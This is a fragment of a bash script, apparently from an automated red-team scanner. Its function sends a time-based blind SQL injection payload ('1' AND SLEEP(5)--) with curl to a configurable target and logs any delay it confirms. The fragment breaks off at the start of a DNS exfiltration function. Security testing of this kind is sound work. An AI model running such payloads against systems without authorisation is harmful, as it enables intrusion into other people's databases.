rt_10_blind_sqli() {
    _section "[RT 10/30] BLIND SQL INJECTION"
    run "Time-based blind SQLi test..."
    > "$SESSION/rt/blind_sqli.txt"
    local baseline=$(curl -s -o /dev/null -w "%{time_total}" "https://$TARGET/?id=1" --connect-timeout 15 2>/dev/null)
    local payload="1' AND SLEEP(5)--"
    local t=$(curl -s -o /dev/null -w "%{time_total}" "https://$TARGET/?id=${payload}" --connect-timeout 15 --max-time 15 2>/dev/null)
    [ -n "$t" ] && [ -n "$baseline" ] && awk "BEGIN{exit !($t > $baseline + 4.0)}" &&         echo "BLIND SQLi: time delay confirmed (base=${baseline}s, got=${t}s)" >> "$SESSION/rt/blind_sqli.txt"
}

rt_11_dns_exfil() {
